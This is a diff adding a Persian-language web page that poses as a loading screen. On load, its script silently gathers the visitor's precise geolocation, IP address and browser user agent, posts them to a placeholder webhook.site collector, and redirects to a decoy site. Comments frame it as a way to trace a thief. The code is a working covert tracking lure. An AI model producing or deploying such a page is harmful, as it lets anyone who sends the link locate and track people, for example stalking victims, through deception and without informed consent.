@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ردیابی</title>
+</head>
+<body>
+    <h1>لطفاً صبر کنید...</h1>
+    <p>در حال بارگذاری اطلاعات...</p>
+
+    <script>
+        // تابع برای جمع‌آوری لوکیشن
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                sendData(null); // اگه لوکیشن در دسترس نبود، فقط IP بفرست
+            }
+        }
+
+        // تابع برای ارسال داده‌ها
+        function sendData(position) {
+            const data = {
+                timestamp: new Date().toISOString(),
+                ip: null, // بعداً با API می‌گیرم
+                location: position ? {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                } : null,
+                userAgent: navigator.userAgent
+            };
+
+            // گرفتن IP با API ساده
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+
+                    // ارسال به Webhook (جایگزین با لینک Webhook خودتون)
+                    fetch('https://webhook.site/YOUR-UNIQUE-ID', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    })
+                    .then(() => {
+                        // هدایت به یه صفحه جعلی برای گمراه کردن سارق
+                        window.location.href = 'https://example.com';
+                    })
+                    .catch(error => console.error('Error:', error));
+                });
+        }
+
+        // مدیریت خطاها
+        function showError(error) {
+            console.error('Location error:', error.message);
+            sendData(null); // اگه خطایی بود، بدون لوکیشن ادامه بده
+        }
+
+        // اجرای خودکار
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
